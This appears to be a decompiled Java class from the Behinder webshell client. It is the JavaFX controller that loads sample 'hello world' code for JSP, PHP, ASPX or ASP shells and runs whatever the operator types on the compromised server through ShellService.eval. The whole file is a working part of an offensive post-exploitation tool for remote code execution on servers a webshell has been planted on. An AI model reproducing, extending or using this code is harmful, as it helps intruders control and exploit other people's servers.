package net.rebeyond.behinder.ui.controller;

import java.util.List;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import org.json.JSONObject;

public class UserCodeViewController {
   private ShellManager shellManager;
   @FXML
   private TextArea sourceCodeTextArea;
   @FXML
   private TextArea sourceResultArea;
   @FXML
   private Button runCodeBtn;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   private List workList;
   private Label statusLabel;

   public void init(ShellService shellService, List workList, Label statusLabel) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.initUserCodeView();
   }

   private void initUserCodeView() {
      String javaCodeDemo = "import javax.servlet.ServletOutputStream;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpSession;\nimport javax.servlet.jsp.PageContext;\n\npublic class Test {\n\n\tprivate ServletRequest Request;\n\tprivate ServletResponse Response;\n\tprivate HttpSession Session;\n\t\n\t@Override\n\tpublic boolean equals(Object obj){\n\n\t\tPageContext page = (PageContext) obj;\n\t\tthis.Session=page.getSession();\n\t\tthis.Response=page.getResponse();\n\t\tthis.Request=page.getRequest();\n\n\t\t\ttry {\n\t\t\t\tServletOutputStream so=Response.getOutputStream();\n\t\t\t\tso.write(\"hello world\".getBytes(\"UTF-8\"));\n\t\t\t\tso.flush();\n\t\t\t\tso.close();\n\t\t\t\tpage.getOut().clear();  \n\t\t\t} catch (Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} \n\t\treturn true;\n\t}\n}";
      String phpCodeDemo = "echo \"hello world\";";
      String aspxCodeDemo = "using System;\nusing System.Web;\nusing System.Web.SessionState;\n\n    public class Eval\n    {\n        public HttpRequest Request;\n        public HttpResponse Response;\n        public HttpSessionState Session;\n\t\n\tpublic void eval(System.Web.UI.Page page)\n\t{\n\t\tthis.Response = page.Response;\n\t\tResponse.Write(\"hello world\");  \n\t}\n  }";
      String aspCodeDemo = "response.write(\"hello world\")";
      String currentType = this.shellEntity.getString("type");
      byte var7 = -1;
      switch(currentType.hashCode()) {
      case 96894:
         if (currentType.equals("asp")) {
            var7 = 3;
         }
         break;
      case 105543:
         if (currentType.equals("jsp")) {
            var7 = 0;
         }
         break;
      case 110968:
         if (currentType.equals("php")) {
            var7 = 1;
         }
         break;
      case 3003834:
         if (currentType.equals("aspx")) {
            var7 = 2;
         }
      }

      switch(var7) {
      case 0:
         this.sourceCodeTextArea.setText(javaCodeDemo);
         break;
      case 1:
         this.sourceCodeTextArea.setText(phpCodeDemo);
         break;
      case 2:
         this.sourceCodeTextArea.setText(aspxCodeDemo);
         break;
      case 3:
         this.sourceCodeTextArea.setText(aspCodeDemo);
      }

      this.runCodeBtn.setOnAction((event) -> {
         this.runSourceCode();
      });
   }

   private void runSourceCode() {
      this.statusLabel.setText("正在执行……");
      Runnable runner = () -> {
         try {
            String result = this.currentShellService.eval(this.sourceCodeTextArea.getText());
            Platform.runLater(() -> {
               this.sourceResultArea.setText(result);
               this.statusLabel.setText("完成。");
            });
         } catch (Exception var2) {
            var2.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("运行失败:" + var2.getMessage());
               this.sourceResultArea.setText(var2.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }
}
